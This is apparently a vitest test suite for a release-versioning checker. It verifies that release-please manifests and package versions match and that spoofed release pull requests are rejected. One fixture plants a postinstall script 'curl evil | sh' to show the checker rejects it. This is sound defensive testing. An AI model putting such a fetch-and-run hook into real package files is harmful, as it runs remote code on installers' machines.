import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { checkCoverage, checkEdits, compareSemver } from '../check-versions.mjs';

const CONFIG = 'release-please-config.json';
const MANIFEST = '.release-please-manifest.json';

let dir;
const git = (...args) => execFileSync('git', args, { cwd: dir, encoding: 'utf8' }).trim();
const put = (path, content) => {
  mkdirSync(dirname(join(dir, path)), { recursive: true });
  writeFileSync(join(dir, path), typeof content === 'string' ? content : JSON.stringify(content, null, 2) + '\n');
};
const pkg = (name, version) => ({ name, version, private: true });
const BOT = { name: 'github-actions[bot]', email: '41898282+github-actions[bot]@users.noreply.github.com' };
const HUMAN = { name: 't', email: 't@example.com' };
const commit = (msg, who = HUMAN, committer = who) => {
  git('add', '-A');
  execFileSync('git', ['commit', '-q', '-m', msg, '--no-gpg-sign'], {
    cwd: dir,
    env: {
      ...process.env,
      GIT_AUTHOR_NAME: who.name,
      GIT_AUTHOR_EMAIL: who.email,
      GIT_COMMITTER_NAME: committer.name,
      GIT_COMMITTER_EMAIL: committer.email,
    },
  });
  return git('rev-parse', 'HEAD');
};
const config = (packages) => ({
  'separate-pull-requests': true,
  'include-component-in-tag': true,
  packages,
});

function baseRepo() {
  put('package.json', pkg('root', '1.0.0'));
  put('packages/a/package.json', pkg('a', '0.2.0'));
  put(CONFIG, config({ '.': { component: 'root' }, 'packages/a': { component: 'a' } }));
  put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.2.0' });
  return commit('chore: init');
}

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'fleet-versions-'));
  git('init', '-q', '-b', 'main');
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

describe('checkCoverage', () => {
  it('passes when every package.json is configured and matches the manifest', () => {
    baseRepo();
    expect(checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST })).toEqual([]);
  });

  it('flags a package that release-please does not know about', () => {
    baseRepo();
    put('packages/b/package.json', pkg('b', '0.1.0'));
    commit('feat: add b');
    const problems = checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST });
    expect(problems.join('\n')).toMatch(/packages\/b\/package\.json is not in/);
  });

  it('ignores package.json files under node_modules', () => {
    baseRepo();
    put('node_modules/x/package.json', pkg('x', '9.9.9'));
    git('add', '-f', '-A');
    git('-c', 'user.name=t', '-c', 'user.email=t@example.com', 'commit', '-q', '-m', 'chore: vendored', '--no-gpg-sign');
    expect(checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST })).toEqual([]);
  });

  it('flags a version that disagrees with the manifest', () => {
    baseRepo();
    put('packages/a/package.json', pkg('a', '0.3.0'));
    commit('chore: x');
    const problems = checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST });
    expect(problems.join('\n')).toMatch(/says version 0\.3\.0 but .* says 0\.2\.0/);
  });

  it('requires one release PR per package, a component per package, and unique components', () => {
    baseRepo();
    put(CONFIG, { packages: { '.': { component: 'x' }, 'packages/a': { component: 'x' } } });
    commit('chore: config');
    const text = checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST }).join('\n');
    expect(text).toMatch(/separate-pull-requests/);
    expect(text).toMatch(/component "x" is used by two packages/);
  });

  it('fails when the config file is missing', () => {
    put('package.json', pkg('root', '1.0.0'));
    commit('chore: init');
    expect(checkCoverage({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST })[0]).toMatch(/is missing/);
  });
});

describe('checkEdits', () => {
  const run = (base, head, extra = {}) =>
    checkEdits({ cwd: dir, configPath: CONFIG, manifestPath: MANIFEST, baseSha: base, headSha: head, ...extra });

  it('allows changes that do not touch versions', () => {
    const base = baseRepo();
    put('packages/a/package.json', { ...pkg('a', '0.2.0'), description: 'edited' });
    expect(run(base, commit('docs: describe a'))).toEqual([]);
  });

  it('refuses a hand-edited package.json version', () => {
    const base = baseRepo();
    put('packages/a/package.json', pkg('a', '0.2.1'));
    const problems = run(base, commit('fix: bump by hand'));
    expect(problems).toHaveLength(1);
    expect(problems[0]).toMatch(/packages\/a\/package\.json: version changed 0\.2\.0 -> 0\.2\.1/);
  });

  it('refuses removing the version field', () => {
    const base = baseRepo();
    put('packages/a/package.json', { name: 'a', private: true });
    expect(run(base, commit('chore: drop version'))[0]).toMatch(/\(removed\)/);
  });

  it('refuses a hand-edited manifest entry', () => {
    const base = baseRepo();
    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.9.0' });
    expect(run(base, commit('chore: manifest'))[0]).toMatch(/Only release-please's release PR/);
  });

  const release = (extra = {}) => ({
    headRef: 'release-please--branches--main--components--a',
    headRepo: 'o/r',
    baseRepo: 'o/r',
    prAuthor: 'github-actions[bot]',
    ...extra,
  });
  const bump = (version = '0.3.0') => {
    put('packages/a/package.json', pkg('a', version));
    put(MANIFEST, { '.': '1.0.0', 'packages/a': version });
  };

  it("allows release-please's own pull request: bot author, bot commits, only version, manifest and changelog files", () => {
    const base = baseRepo();
    bump();
    put('packages/a/CHANGELOG.md', '# Changelog\n\n## 0.3.0\n');
    const head = commit('chore(main): release a 0.3.0', BOT, { name: 'GitHub', email: 'noreply@github.com' });
    expect(run(base, head, release())).toEqual([]);
  });

  describe('spoofing the release exemption', () => {
    it('refuses a human who only names the branch like release-please', () => {
      const base = baseRepo();
      bump('9.9.9');
      const head = commit('chore: sneaky');
      const problems = run(base, head, release({ prAuthor: 'mallory' }));
      const text = problems.join('\n');
      expect(text).toMatch(/named like a release-please branch but this is not release-please's pull request/);
      expect(text).toMatch(/opened by "mallory"/);
      expect(text).toMatch(/authored by t@example\.com/);
      expect(text).toMatch(/packages\/a\/package\.json: version changed 0\.2\.0 -> 9\.9\.9/);
    });

    it('refuses the bot as author when a human committed onto the branch', () => {
      const base = baseRepo();
      bump();
      commit('chore(main): release a 0.3.0', BOT);
      put('packages/a/package.json', pkg('a', '9.9.9'));
      put(MANIFEST, { '.': '1.0.0', 'packages/a': '9.9.9' });
      const head = commit('fix: edit the release', HUMAN);
      expect(run(base, head, release()).join('\n')).toMatch(/commit [0-9a-f]{7} is authored by t@example\.com/);
    });

    it('refuses a bot-authored branch whose pull request was opened by someone else', () => {
      const base = baseRepo();
      bump();
      const head = commit('chore(main): release a 0.3.0', BOT);
      expect(run(base, head, release({ prAuthor: 'mallory' })).join('\n')).toMatch(/opened by "mallory"/);
    });

    it('refuses a release PR that touches a file release-please does not write', () => {
      const base = baseRepo();
      bump();
      put('src/evil.mjs', 'process.exit(0)\n');
      const head = commit('chore(main): release a 0.3.0', BOT);
      expect(run(base, head, release()).join('\n')).toMatch(/src\/evil\.mjs is not a file release-please writes/);
    });

    it('refuses a release PR that changes more of package.json than the version', () => {
      const base = baseRepo();
      put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.3.0' });
      put('packages/a/package.json', { ...pkg('a', '0.3.0'), scripts: { postinstall: 'curl evil | sh' } });
      const head = commit('chore(main): release a 0.3.0', BOT);
      expect(run(base, head, release()).join('\n')).toMatch(/changes more than "version"/);
    });

    it('refuses a release PR whose versions go down or stay put', () => {
      const base = baseRepo();
      bump('0.1.0');
      const head = commit('chore(main): release a 0.1.0', BOT);
      expect(run(base, head, release()).join('\n')).toMatch(/does not go up/);
    });

    it('refuses a release PR from a fork even when everything else matches', () => {
      const base = baseRepo();
      bump();
      const head = commit('chore(main): release a 0.3.0', BOT);
      expect(run(base, head, release({ headRepo: 'fork/r' })).join('\n')).toMatch(/a fork/);
    });

    it('honours a configured actor and extra release files, and nothing else', () => {
      const base = baseRepo();
      const app = { name: 'release-app[bot]', email: '7+release-app[bot]@users.noreply.github.com' };
      bump();
      put('packages/a/pyproject.toml', 'version = "0.3.0"\n');
      const head = commit('chore(main): release a 0.3.0', app);
      const ctx = release({ prAuthor: 'release-app[bot]', actors: ['release-app[bot]'], extraFiles: ['packages/*/pyproject.toml'] });
      expect(run(base, head, ctx)).toEqual([]);
      expect(run(base, head, release({ prAuthor: 'release-app[bot]', actors: ['release-app[bot]'] })).join('\n')).toMatch(/pyproject\.toml is not a file release-please writes/);
    });
  });

  it('lets a new package declare its starting version when the manifest agrees', () => {
    const base = baseRepo();
    put('packages/b/package.json', pkg('b', '0.1.0'));
    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.2.0', 'packages/b': '0.1.0' });
    expect(run(base, commit('feat: add b'))).toEqual([]);
  });

  it('refuses a new package whose version differs from its manifest entry', () => {
    const base = baseRepo();
    put('packages/b/package.json', pkg('b', '3.0.0'));
    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.2.0', 'packages/b': '0.1.0' });
    expect(run(base, commit('feat: add b'))[0]).toMatch(/is new with version 3\.0\.0/);
  });

  it('compares against the merge base, not the moved tip of main', () => {
    const base = baseRepo();
    git('checkout', '-q', '-b', 'topic');
    put('x.txt', 'topic');
    const head = commit('feat: topic work');
    git('checkout', '-q', 'main');
    put('packages/a/package.json', pkg('a', '0.2.1'));
    put(MANIFEST, { '.': '1.0.0', 'packages/a': '0.2.1' });
    const tip = commit('chore(main): release a 0.2.1');
    expect(run(tip, head)).toEqual([]);
    expect(base).not.toBe(tip);
  });
});

describe('compareSemver', () => {
  it.each([
    ['0.3.0', '0.2.0', 1],
    ['0.2.6-bookcase.2', '0.2.5-bookcase.2', 1],
    ['0.3.0', '0.3.0-rc.1', 1],
    ['0.3.0-rc.2', '0.3.0-rc.10', -1],
    ['1.0.0', '1.0.0', 0],
  ])('%s vs %s', (a, b, sign) => {
    expect(Math.sign(compareSemver(a, b))).toBe(sign);
  });
  it('is null for a non-version', () => expect(compareSemver('latest', '1.0.0')).toBeNull());
});
